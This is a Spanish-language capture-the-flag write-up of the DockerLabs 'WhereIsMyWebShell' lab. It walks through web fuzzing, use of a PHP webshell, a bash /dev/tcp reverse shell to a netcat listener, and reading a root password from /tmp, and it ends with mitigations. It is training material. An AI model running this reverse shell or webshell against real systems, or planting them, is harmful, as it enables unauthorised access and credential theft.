# WhereIsMyWebShell — DockerLabs Writeup

**Platform:** DockerLabs | **Difficulty:** Easy | **Target IP:** 172.17.0.2 | 

## Descripcion 

Laboratorio para practicar la localización y subida de una webshell para ganar acceso, con escalada de privilegios mediante sudo.

**Nmap → Web Enumeration → Directory Fuzzing → shell.php Discovery → Command Injection via id Parameter → Reverse Shell (Netcat) → Initial Access → Privilege Escalation via /temp Clue → Root Access**


### 1. Analisis y escaneo del objetivo.

```text
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/02-faciles/whereIsMyWebShell]
└─$ nmap -sC -sV 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-09 19:05 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000070s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Academia de Ingl\xC3\xA9s (Inglis Academi)
MAC Address: 16:98:CB:5A:65:0B (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.01 seconds

```
Se encuentra unicamente el servidor apache, ingresamos a la IP para verificar que encontramos. 

![pagina](./images/academia.png)

Nos dejan la siguiente pista en la pagina que es de utilidad para mas adelante. 

![pista](./images/pista.png)

Continuamos para realizar una enumeracion web.

## 2. Fuzzing WEB 

Realizamos un fuzzing web para buscar directorios o archivos ocultos. 

```text
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/02-faciles/whereIsMyWebShell]
└─$ gobuster dir  -u http://172.17.0.2/  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,htm,txt,bak,old,zip,conf,config,log
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,htm,txt,old,zip,conf,log,bak,config
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 2510]
shell.php            (Status: 500) [Size: 0]
server-status        (Status: 403) [Size: 275]
warning.html         (Status: 200) [Size: 315]
index.html           (Status: 200) [Size: 2510]
Progress: 685091 / 685091 (100.00%)
===============================================================
Finished
===============================================================
                                                                  
```
Accedemos a  `172.17.0.2/warning.html` nos aportan la siguiente pista

![pista2](./images/pista2.png)

Teniendo en cuenta la pista se procede con un segundo fuzzing relacionando que es debido al archivo `shell.php` notando que nos da un codigo de error 500, significando que no se pudo realizar la solicitad debido a algun fallo.

```text
                                                                                                                                                     
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/02-faciles/whereIsMyWebShell]
└─$ gobuster fuzz -u "http://172.17.0.2/shell.php?FUZZ=id" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -b 500
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/shell.php?FUZZ=id
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
[+] Excluded Status codes:   500
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in fuzzing mode
===============================================================
[Status=200] [Length=66] [Word=parameter] http://172.17.0.2/shell.php?parameter=id
Progress: 6453 / 6453 (100.00%)
===============================================================
Finished
===============================================================

```
Realizado el segundo fuzzing tenemos un codigo exitoso, 200, el cual si se realiza la peticion la responde ok de la siguiente manera `http://172.17.0.2/shell.php?parameter=id`

Hacemos la comprobacion curl y vemos que ejecuta dicha peticion.

```text
┌──(mariano㉿Kaotic)-[/tmp]
└─$ curl http://172.17.0.2/shell.php?parameter=id  
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```            
Concluimos que tenemos un RCE (Remote Code Execution), procedemos a explotarlo.


## 3. Remote Code Execution.

Sabiendo que podemos ejecutar codigo de manera remota, procedemos a explotar dicha falla y usamos la pista dada por la pagina de buscar en `/tmp/`

```text
┌──(mariano㉿Kaotic)-[/tmp]
└─$ curl -G "http://172.17.0.2/shell.php" --data-urlencode "parameter=ls -la /tmp"
<pre>total 12
drwxrwxrwt 1 root root 4096 Oct  9 21:54 .
drwxr-xr-x 1 root root 4096 Oct  9 21:54 ..
-rw-r--r-- 1 root root   21 Apr 12  2024 .secret.txt
</pre>
```
Sabiendo el nombre del archivo, lo leemos de la misma forma, para obtener la contraseña del usuario `root.`

```text
┌──(mariano㉿Kaotic)-[/tmp]
└─$ curl -G "http://172.17.0.2/shell.php" --data-urlencode "parameter=cat /tmp/.secret.txt"
<pre>contraseñaderoot123
</pre>
        
```
Teniendo la contraseña de root nos ponemos a la escucha con netcat y enviamos la peticion por curl para obtener la conexion.

```
┌──(mariano㉿Kaotic)-[/tmp]
└─$ nc -lvnp 4444
listening on [any] 4444 ...

```

```
┌──(mariano㉿Kaotic)-[/tmp]
└─$ curl -G "http://172.17.0.2/shell.php" --data-urlencode "parameter=bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'"
```
Obtenemos la conexion y pasamos a usuario root.

```
www-data@040f84c1f96a:/var/www/html$ su root
su root
Password: contraseñaderoot123
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
```

## Verificando .php y permisos.

Vemos el archivo .php, y vemos que debido a dicho archivos es por el cual se puede realizar la ejecucion de codigo remoto entre otras cosas.

```
www-data@040f84c1f96a:/var/www/html$ cat shell.php
cat shell.php
<?php
    echo "<pre>" . shell_exec($_REQUEST['parameter']) . "</pre>";
?>
```
Asi mismo fuera del usuario `root` podemos visualizar el archivo `.secret.txt`

```
www-data@040f84c1f96a:/tmp$ whoami
whoami
www-data
www-data@040f84c1f96a:/tmp$ ls -la
ls -la
total 12
drwxrwxrwt 1 root root 4096 Oct  9 21:54 .
drwxr-xr-x 1 root root 4096 Oct  9 21:54 ..
-rw-r--r-- 1 root root   21 Apr 12  2024 .secret.txt
www-data@040f84c1f96a:/tmp$ cat .secret.txt
cat .secret.txt
contraseñaderoot123
```


# Conclusión

A partir del escaneo inicial con **Nmap**, se identificó un servidor **Apache** en el puerto `80`, que constituía el principal punto de entrada a la máquina.

Al ingresar al sitio web, se encontró una pista que indicaba revisar el directorio `/temp`. A partir de esta información, se realizó un proceso de enumeración mediante **fuzzing**, utilizando el cual se descubrió el archivo `shell.php`.

Posteriormente, se investigó el comportamiento de `shell.php` mediante consultas al parámetro `id`, comprobando que era posible ejecutar comandos del sistema operativo a través de solicitudes web. Esto permitió identificar una vulnerabilidad de **ejecución remota de comandos (RCE)**.

Para obtener una shell interactiva, se preparó una escucha con **Netcat** en la máquina atacante y se envió una petición desde el sistema objetivo para establecer una conexión inversa (*Reverse Shell*). De esta manera, se consiguió acceso a la máquina.

Finalmente, se retomó la pista encontrada al comienzo sobre el directorio `/temp`. Mediante una petición web realizada con `curl` y aprovechando la ejecución de comandos a través de PHP, se siguieron las indicaciones necesarias para realizar la escalada de privilegios hasta obtener acceso como **root**.

En conclusión, la máquina **WhereIsMyWebShell** demuestra cómo una enumeración web adecuada permite descubrir archivos sensibles y cómo una webshell vulnerable puede facilitar la ejecución remota de comandos, la obtención de acceso al sistema y, aprovechando las pistas y configuraciones presentes en la máquina, la escalada de privilegios.

| Vulnerabilidad / Técnica | Impacto | Mitigación |
|---|---|---|
| **Archivo `shell.php` accesible** | Expone una funcionalidad potencialmente peligrosa desde el servidor web. | Eliminar las webshells y restringir el acceso a archivos sensibles. |
| **Ejecución de comandos mediante el parámetro `id`** | Permite ejecutar comandos remotamente a través de solicitudes HTTP. | Evitar ejecutar comandos del sistema a partir de parámetros controlados por el usuario. |
| **Conexión inversa mediante Netcat** | Permite obtener una shell interactiva en la máquina objetivo. | Corregir la vulnerabilidad inicial y restringir las conexiones salientes innecesarias. |
| **Escalada de privilegios** | Permite pasar de un acceso limitado a privilegios de `root`. | Revisar permisos, configuraciones y mecanismos de ejecución privilegiada. |

## Recomendaciones generales

- Evitar exponer webshells y funcionalidades que permitan ejecutar comandos desde el navegador.
- Revisar los directorios temporales y los archivos accesibles desde el servidor web.
- Validar las entradas recibidas mediante parámetros HTTP.
- Restringir los permisos de los procesos que ejecutan servicios web.
- Auditar las configuraciones del sistema para prevenir escaladas de privilegios.


